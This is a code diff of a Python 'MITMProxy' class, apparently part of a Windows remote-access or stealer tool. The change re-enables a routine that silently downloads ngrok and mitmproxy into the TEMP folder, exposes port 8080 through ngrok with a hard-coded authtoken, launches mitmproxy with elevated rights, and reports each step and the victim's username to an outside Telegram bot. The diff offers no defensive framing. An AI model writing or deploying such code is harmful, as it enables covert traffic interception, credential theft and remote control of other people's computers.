@@ -17,10 +17,10 @@ class MITMProxy():
 	def Main(self):
 		os.system('taskkill /IM ngrok.exe /F')
 		os.system('taskkill /IM mitmproxy.exe /F')
-		#self.MITM_Proxy()
+		self.MITM_Proxy()
 		self.Ngrok()
 	def Ngrok(self):
-		self.SendMessage(" Donwloading Ngrok...")
+		self.SendMessage("%F0%9F%93%8C Donwloading Ngrok...")
 		req = requests.get(self.ngrok)
 		
 		filename = os.environ['TEMP'] + "\\ngrok.zip"
@@ -32,11 +32,11 @@ class MITMProxy():
 			zip_ref.extractall(os.environ['TEMP'])
 		Popen([os.environ['TEMP'] + "\\ngrok.exe","authtoken","27D5cTLjSznClCfArRRGjs2os83_6Ps5YmFqGTfUVZgvnR7e1"])
 		shell.ShellExecuteEx(lpFile=os.environ['TEMP'] + "\\ngrok.exe", lpParameters="tcp 8080")
-		self.SendMessage(" Ngrok Executed.")
+		self.SendMessage("%E2%9C%94%EF%B8%8F Ngrok Executed.")
 
 	def MITM_Proxy(self):
 		print(111111)
-		self.SendMessage(" Donwloading MITMF...")
+		self.SendMessage("%F0%9F%93%8C Donwloading MITMF...")
 		req = requests.get(self.mitmfproxy)
 		
 		filename = os.environ['TEMP'] + "\\mitmfproxy.zip"
@@ -45,9 +45,9 @@ class MITMProxy():
 		file.close()
 		with ZipFile(filename, 'r') as zip_ref:
 			zip_ref.extractall(os.environ['TEMP'])
-		self.SendMessage(" MITMProxy Executed.")
+		self.SendMessage("%E2%9C%94%EF%B8%8F MITMProxy Executed.")
 		shell.ShellExecuteEx(lpVerb='runas', lpFile=os.environ['TEMP']+"\\mitmfproxy\\mitmproxy.exe")
-		#self.SendMessage(" Reverse Proxy Ready.")
+		self.SendMessage("%E2%9C%94%EF%B8%8F Reverse Proxy Ready.")
 	def SendMessage(self,message):
 		requests.get("https://api.telegram.org/bot" + self.token + "/sendMessage?text=" + message + "\n--" + getpass.getuser() + "--&chat_id=" + self.chat_id)
 
